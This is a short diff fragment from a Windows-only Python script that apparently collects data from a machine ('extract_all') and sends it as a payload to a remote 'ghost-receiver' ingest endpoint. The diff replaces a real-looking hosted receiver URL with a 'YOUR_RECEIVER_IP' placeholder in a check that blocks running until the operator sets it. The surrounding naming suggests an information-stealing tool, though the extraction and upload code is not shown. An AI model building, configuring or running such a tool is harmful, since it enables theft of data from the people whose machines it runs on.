@@ -676,9 +676,9 @@ def main():
         print("[!] This tool requires Windows")
         sys.exit(1)
 
-    if RECEIVER_URL == "https://ghost-receiver-production.up.railway.app/api/ingest":
+    if RECEIVER_URL == "http://YOUR_RECEIVER_IP:3000/api/ingest":
         print("[!] Please set RECEIVER_URL in the script before running")
-        print("    Edit line 22: RECEIVER_URL = 'https://ghost-receiver-production.up.railway.app/api/ingest'")
+        print("    Edit line 22: RECEIVER_URL = 'http://YOUR_IP:3000/api/ingest'")
         sys.exit(1)
 
     payload = extract_all()
